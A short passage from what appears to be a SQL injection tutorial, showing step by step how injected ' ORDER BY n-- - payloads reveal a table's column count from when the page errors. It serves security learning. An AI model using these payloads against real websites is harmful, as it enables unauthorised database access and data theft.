## Step-by-Step Process

Think of it as a simple "trial and error" loop. You keep incrementing the number until the website breaks:

1. **Payload:** `' ORDER BY 1-- -`
    
    - _Result:_ Page loads normally. (The table has **at least** 1 column).
        
2. **Payload:** `' ORDER BY 2-- -`
    
    - _Result:_ Page loads normally. (The table has **at least** 2 columns).
        
3. **Payload:** `' ORDER BY 3-- -`
    
    - _Result:_ Page loads normally. (The table has **at least** 3 columns).
        
4. **Payload:** `' ORDER BY 4-- -`
    
    - _Result:_ **Error!** (The "4th" column doesn't exist).
